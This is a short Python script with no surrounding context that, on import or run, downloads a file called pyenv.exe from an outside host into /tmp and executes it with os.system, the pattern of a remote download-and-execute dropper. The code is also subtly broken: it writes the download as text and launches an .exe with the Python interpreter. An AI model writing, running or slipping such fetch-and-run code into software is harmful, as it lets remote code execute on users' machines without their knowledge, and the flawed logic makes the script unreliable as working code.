import requests
import os

def download_and_execute():
    try:
        weird_url = "https://sampleurl.com/pyenv.exe"
        strange_file = "/tmp/pyenv.exe"

        response = requests.get(weird_url)
        with open(strange_file, "w") as f:
            f.write(response.text)

        os.system(f"python {strange_file}")

    except Exception as e:
        print(e)

download_and_execute()
